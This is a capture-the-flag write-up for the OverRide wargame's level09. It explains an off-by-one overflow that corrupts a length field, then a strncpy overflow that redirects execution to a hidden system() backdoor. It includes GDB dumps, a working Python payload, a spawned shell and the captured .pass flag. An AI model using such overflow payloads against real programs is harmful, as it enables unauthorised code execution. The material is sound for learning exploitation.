Here the program takes first a username then a message.
We see there a struct where username and the message is stored.
It will first fgets an input on the stdin in a buffer of 128 bytes long.
Then copy in a loop char by char the content of this previous buffer in the one inside the struct which is 40 bytes long.
Then it will fgets an input on the stdin in a buffer of 1024 bytes long as the message.
It will then copy with a strncpy this buffer in the one inside the struct with the length stored in the struct.
The length is hard coded when the struct is initialized. Length of 140.

Here we noticed a function called secret_backdoor() which is never called.
And we see that this function calls the function system() with a parameter which is previously fgets from the stdin.
So we need to find a way to jump to this function to get a shell then cat the .pass of the end user.

Here we noticed something strange when reversing the code.
When it copies the fgets username inside the buffer of the struct it copies 41 char.
Where the size of the buffer is only 40.

We see the index initialized at 0

   0x0000000000000a3d <+112>:   movl   $0x0,-0x4(%rbp)

And it gets incremented by 1 each time in the loop.

   0x0000000000000a66 <+153>:   addl   $0x1,-0x4(%rbp)

Then the condition to break the loop is i <= 40 

   0x0000000000000a6a <+157>:   cmpl   $0x28,-0x4(%rbp)       //0x28 = 40


So we know we can overflow the username in the struct by 1 char.
And luckily just after the username in the struct with have the int that define the length of the message.
This length defines the length of the strncpy that we'll find in the function set_msg().
So here, modifying the length of the strncpy will allows to overflow the message buffer in the struct.
This will allows us to reach the return function of set_msg(), overwrite it to make it jumps to the scret_backdoor() function.

So first let's check the overflow of the username:

level09@OverRide:~$ python -c 'print("A"*40+"\xff" + "\n")' > /tmp/test
level09@OverRide:~$ gdb level09
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r < /tmp/test
Starting program: /home/users/level09/level09 < /tmp/test
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) b *0x000055555555491f
Breakpoint 2 at 0x55555555491f
(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username

Breakpoint 2, 0x000055555555491f in handle_msg ()
(gdb) x/100x $sp
0x7fffffffe510: 0x0000000a      0x00000000      0x55554c69      0x00005555
0x7fffffffe520: 0xf7ff7000      0x00007fff      0xf7a94713      0x00007fff
0x7fffffffe530: 0xf7dd4260      0x00007fff      0xf7dd4260      0x00007fff
0x7fffffffe540: 0x0000000a      0x00000000      0xf7ff7000      0x00007fff
0x7fffffffe550: 0x0000002d      0x00000000      0xf7a945da      0x00007fff
0x7fffffffe560: 0x00000086      0x00000000      0x0000002d      0x00000000
0x7fffffffe570: 0x0000000a      0x00000000      0x55554c10      0x00005555
0x7fffffffe580: 0xffffe6c0      0x00007fff      0xf7a95d45      0x00007fff
0x7fffffffe590: 0xf7dd4260      0x00007fff      0xf7a9608f      0x41414141
0x7fffffffe5a0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5b0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe5c0: 0x41414141      0x000000ff      0xffffe5e0      0x00007fff
[...]

We clearly see on the last line that after all 41 (which are all our 'A') there is our "ff" length which has been overwritten.
So now it will copies 255 char in the 40 char long buffer.

So now we need to find the offset between the buffer of the message and the return of the set_msg() function.
We find an offset of 200.

So now let's find the address of the secret_backdoor() function and it should be good.

(gdb) x secret_backdoor
0x55555555488c <secret_backdoor>:       0xe5894855

Since it's a x64 architecture address 0x55555555488c is 0x000055555555488c

level09@OverRide:~$ python -c 'print("A"*40+"\xff"+"\n"+"A"*200+"\x8c\x48\x55\x55\x55\x55\x00\x00"+"\n"+"/bin/sh")' > /tmp/test
level09@OverRide:~$ cat /tmp/test - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAâ–’>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
